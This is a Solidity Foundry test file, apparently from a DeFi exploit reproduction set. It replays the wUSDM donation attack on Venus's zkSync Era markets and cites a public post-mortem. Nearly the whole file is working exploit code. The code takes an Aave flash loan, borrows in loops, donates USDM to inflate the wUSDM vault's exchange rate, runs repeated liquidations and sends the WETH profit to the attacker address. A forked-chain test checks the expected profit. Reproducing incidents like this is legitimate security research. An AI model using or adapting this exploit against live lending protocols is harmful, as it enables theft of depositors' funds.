// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import {IAaveFlashloan, IERC20, IERC4626, IUnitroller} from "../interface.sol";

// @KeyInfo - Simplified explicit PoC (zkSync Era)
// Tx: https://explorer.zksync.io/tx/0x35a0172fb6bd450ceb29aa67dc85221826dfd0b7528375400b4ccf15c1eed0d8
// Attack Contract : https://explorer.zksync.io/address/0x68c8020A052d5061760e2AbF5726D59D4ebe3506
// Block: 56669987

// @Analysis
// Post-mortem :https://community.venus.io/t/post-mortem-wusdm-donation-attack-on-venus-zksync/5004

interface IVTokenSimplified {
    function balanceOf(address owner) external view returns (uint256);

    function mint(uint256 mintAmount) external returns (uint256);

    function borrow(uint256 borrowAmount) external returns (uint256);

    function borrowBalanceStored(address account) external view returns (uint256);

    function liquidateBorrow(address borrower, uint256 repayAmount, address cTokenCollateral) external returns (uint256);

    function redeem(uint256 redeemTokens) external returns (uint256);

    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);

    function getAccountSnapshot(address account) external view returns (uint256, uint256, uint256, uint256);
}

contract ZKSync_wUSDM_WETH_tx35a0_LiquidationHelper {
    IERC20 internal constant WETH = IERC20(0x5AEa5775959fBC2557Cc8789bC1bf90A239D9a91);
    IERC20 internal constant wUSDM = IERC20(0xA900cbE7739c96D2B153a273953620A701d5442b);
    IVTokenSimplified internal constant vWETH = IVTokenSimplified(0x1Fa916C27c7C2c4602124A14C77Dbb40a5FF1BE8);
    IVTokenSimplified internal constant vUSDM = IVTokenSimplified(0x183dE3C349fCf546aAe925E1c7F364EA6FB4033c);
    IUnitroller internal constant VENUS_COMPTROLLER = IUnitroller(0xddE4D098D9995B659724ae6d5E3FB9681Ac941B1);

    uint256 internal constant STANDARD_LIQUIDATION_ROUNDS = 34;
    uint256 internal constant STANDARD_LIQUIDATION_SIZE = 55_000 ether;
    uint256 internal constant FINAL_LIQUIDATION_SIZE = 12_000 ether;
    uint256 internal constant HELPER_FINAL_WETH_BORROW = 162_126_770_849_249_864_389;

    function prepare() external {
        address[] memory helperMarkets = new address[](1);
        helperMarkets[0] = address(vUSDM);
        wUSDM.approve(address(vUSDM), type(uint256).max);
        VENUS_COMPTROLLER.enterMarkets(helperMarkets);
    }

    function mintReceivedWUSDM(uint256 amount) external {
        require(vUSDM.mint(amount) == 0, "helper: mint wUSDM failed");
    }

    function returnWUSDM(address to, uint256 amount) external {
        require(wUSDM.transfer(to, amount), "helper: return wUSDM failed");
    }

    function run(address target) external {
        for (uint256 i = 0; i < STANDARD_LIQUIDATION_ROUNDS; i++) {
            require(
                vUSDM.liquidateBorrow(target, STANDARD_LIQUIDATION_SIZE, address(vWETH)) == 0,
                "helper: liquidate failed"
            );
            require(vUSDM.redeemUnderlying(STANDARD_LIQUIDATION_SIZE) == 0, "helper: redeem vUSDM failed");
        }
        require(
            vUSDM.liquidateBorrow(target, FINAL_LIQUIDATION_SIZE, address(vWETH)) == 0,
            "helper: final liquidate failed"
        );
        require(vUSDM.redeemUnderlying(FINAL_LIQUIDATION_SIZE) == 0, "helper: final redeem vUSDM failed");
        require(vWETH.redeem(vWETH.balanceOf(address(this))) == 0, "helper: redeem seized vWETH failed");
        require(vWETH.borrow(HELPER_FINAL_WETH_BORROW) == 0, "helper: final WETH borrow failed");
        require(WETH.transfer(target, WETH.balanceOf(address(this))), "helper: send WETH back failed");
    }
}

contract ZKSync_wUSDM_WETH_tx35a0_AttackReceiver {
    IERC20 internal constant WETH = IERC20(0x5AEa5775959fBC2557Cc8789bC1bf90A239D9a91);
    IERC20 internal constant USDM = IERC20(0x7715c206A14Ac93Cb1A6c0316A6E5f8aD7c9Dc31);
    IERC20 internal constant wUSDM = IERC20(0xA900cbE7739c96D2B153a273953620A701d5442b);
    IVTokenSimplified internal constant vWETH = IVTokenSimplified(0x1Fa916C27c7C2c4602124A14C77Dbb40a5FF1BE8);
    IVTokenSimplified internal constant vUSDM = IVTokenSimplified(0x183dE3C349fCf546aAe925E1c7F364EA6FB4033c);
    IUnitroller internal constant VENUS_COMPTROLLER = IUnitroller(0xddE4D098D9995B659724ae6d5E3FB9681Ac941B1);
    IAaveFlashloan internal constant AAVE = IAaveFlashloan(0x78e30497a3c7527d953c6B1E3541b021A98Ac43c);

    uint256 internal constant FLASH_LOAN_AMOUNT = 2_100 ether;
    uint256 internal constant FLASH_LOAN_REPAYMENT = 2_101_050_000_000_000_000_000;
    uint256 internal constant PRIMARY_VUSDM_BORROW = 466_050_324_957_200_501_801_273;
    uint256 internal constant PARTIAL_HELPER_VUSDM_MINT = 303_230_204_580_305_270_357_125;
    uint256 internal constant HELPER_WUSDM_RETURN = 107_820_120_376_895_231_444_148;
    uint256 internal constant FINAL_TARGET_VUSDM_BORROW = 303_201_456_628_859_639_068_587;
    uint256 internal constant TARGET_WUSDM_REDEEM_SHARES = 411_021_577_005_754_870_512_735;
    uint256 internal constant TARGET_TOTAL_WETH_SELF_REDEEM = 527_567_480_692_424_453_159;

    address internal immutable attacker;
    ZKSync_wUSDM_WETH_tx35a0_LiquidationHelper internal immutable liquidationHelper;

    constructor(address attacker_, ZKSync_wUSDM_WETH_tx35a0_LiquidationHelper liquidationHelper_) {
        attacker = attacker_;
        liquidationHelper = liquidationHelper_;
    }

    function prepare() external {
        address[] memory targetMarkets = new address[](1);
        targetMarkets[0] = address(vWETH);
        WETH.approve(address(vWETH), type(uint256).max);
        VENUS_COMPTROLLER.enterMarkets(targetMarkets);
    }

    function executeOperation(address asset, uint256 amount, uint256 premium, address initiator, bytes calldata params)
        external
        returns (bool)
    {
        initiator;
        params;

        require(msg.sender == address(AAVE), "callback: not Aave pool");
        require(asset == address(WETH), "callback: unexpected asset");
        require(amount == FLASH_LOAN_AMOUNT, "callback: unexpected amount");
        require(premium == FLASH_LOAN_REPAYMENT - FLASH_LOAN_AMOUNT, "callback: unexpected premium");

        _runSetupPhase();
        _runLiquidationPhase();
        _runSettlementPhase(amount + premium);

        return true;
    }

    function _runSetupPhase() internal {
        require(vWETH.mint(FLASH_LOAN_AMOUNT) == 0, "target: mint vWETH failed");

        for (uint256 i = 0; i < 4; i++) {
            require(vUSDM.borrow(PRIMARY_VUSDM_BORROW) == 0, "target: vUSDM borrow failed");
            require(wUSDM.transfer(address(liquidationHelper), PRIMARY_VUSDM_BORROW), "target: send wUSDM failed");
            liquidationHelper.mintReceivedWUSDM(PRIMARY_VUSDM_BORROW);
        }

        require(vUSDM.borrow(PRIMARY_VUSDM_BORROW) == 0, "target: vUSDM borrow failed");
        require(wUSDM.transfer(address(liquidationHelper), PRIMARY_VUSDM_BORROW), "target: send wUSDM failed");
        liquidationHelper.mintReceivedWUSDM(PARTIAL_HELPER_VUSDM_MINT);
        liquidationHelper.returnWUSDM(address(this), HELPER_WUSDM_RETURN);

        require(vUSDM.borrow(FINAL_TARGET_VUSDM_BORROW) == 0, "target: final vUSDM borrow failed");
        require(vWETH.redeemUnderlying(TARGET_TOTAL_WETH_SELF_REDEEM) == 0, "target: merged WETH redeem failed");
        IERC4626(address(wUSDM)).redeem(TARGET_WUSDM_REDEEM_SHARES, address(this), address(this));
        require(USDM.transfer(address(wUSDM), USDM.balanceOf(address(this))), "target: donate USDM failed");
    }

    function _runLiquidationPhase() internal {
        liquidationHelper.run(address(this));
    }

    function _runSettlementPhase(uint256 repayment) internal {
        uint256 profit = WETH.balanceOf(address(this)) - repayment;
        require(WETH.transfer(attacker, profit), "target: transfer profit failed");
        require(WETH.approve(address(AAVE), repayment), "receiver: approve Aave failed");
    }
}

contract ZKSync_wUSDM_WETH_tx35a0_SimplifiedPoC is BaseTestWithBalanceLog {
    IERC20 internal constant WETH = IERC20(0x5AEa5775959fBC2557Cc8789bC1bf90A239D9a91);
    IERC20 internal constant wUSDM = IERC20(0xA900cbE7739c96D2B153a273953620A701d5442b);
    IVTokenSimplified internal constant vWETH = IVTokenSimplified(0x1Fa916C27c7C2c4602124A14C77Dbb40a5FF1BE8);
    IAaveFlashloan internal constant AAVE = IAaveFlashloan(0x78e30497a3c7527d953c6B1E3541b021A98Ac43c);

    address internal constant FROM = 0x16bE708e257a0dF0F4275eCD9B0f70cE4B45430C;
    uint256 internal constant BLOCK_BEFORE = 56_669_986;
    uint256 internal constant FLASH_LOAN_AMOUNT = 2_100 ether;
    uint256 internal constant EXPECTED_PROFIT = 86_721_141_300_659_762_817;
    uint256 internal constant EXPECTED_PROFIT_DRIFT = 25_000_000_000;
    uint256 internal constant HELPER_FINAL_WUSDM = 55_000_000_000_280_995_751_108;
    uint256 internal constant TARGET_FINAL_VWETH = 300_850_828;
    uint256 internal constant TARGET_FINAL_VWETH_DRIFT = 2;

    ZKSync_wUSDM_WETH_tx35a0_LiquidationHelper internal liquidationHelper;
    ZKSync_wUSDM_WETH_tx35a0_AttackReceiver internal attackReceiver;

    function setUp() public {
        vm.createSelectFork("zksync", BLOCK_BEFORE);

        vm.label(address(WETH), "WETH(zkSync)");
        vm.label(address(wUSDM), "wUSDM(zkSync)");
        vm.label(address(vWETH), "Venus vWETH(Core)");
        vm.label(FROM, "history.attacker");

        liquidationHelper = new ZKSync_wUSDM_WETH_tx35a0_LiquidationHelper();
        attackReceiver = new ZKSync_wUSDM_WETH_tx35a0_AttackReceiver(FROM, liquidationHelper);

        vm.label(address(liquidationHelper), "poc.helper");
        vm.label(address(attackReceiver), "poc.receiver");

        liquidationHelper.prepare();
        attackReceiver.prepare();
    }

    function testSimplifiedAttackFlow() public {
        uint256 attackerWETHBefore = WETH.balanceOf(FROM);

        vm.prank(FROM, FROM);
        AAVE.flashLoanSimple(address(attackReceiver), address(WETH), FLASH_LOAN_AMOUNT, "", 0);

        uint256 attackerWETHAfter = WETH.balanceOf(FROM);
        uint256 attackerProfit = attackerWETHAfter - attackerWETHBefore;

        assertApproxEqAbs(attackerProfit, EXPECTED_PROFIT, EXPECTED_PROFIT_DRIFT, "unexpected WETH profit");
        assertEq(WETH.balanceOf(address(attackReceiver)), 0, "receiver should not keep WETH");
        assertEq(WETH.balanceOf(address(liquidationHelper)), 0, "helper should not keep WETH");
        assertEq(wUSDM.balanceOf(address(attackReceiver)), 0, "receiver should not keep wUSDM");
        assertEq(wUSDM.balanceOf(address(liquidationHelper)), HELPER_FINAL_WUSDM, "unexpected helper residual wUSDM");
        assertApproxEqAbs(
            vWETH.balanceOf(address(attackReceiver)),
            TARGET_FINAL_VWETH,
            TARGET_FINAL_VWETH_DRIFT,
            "unexpected receiver residual vWETH"
        );
        assertEq(vWETH.balanceOf(address(liquidationHelper)), 0, "helper should redeem all vWETH");
    }
}
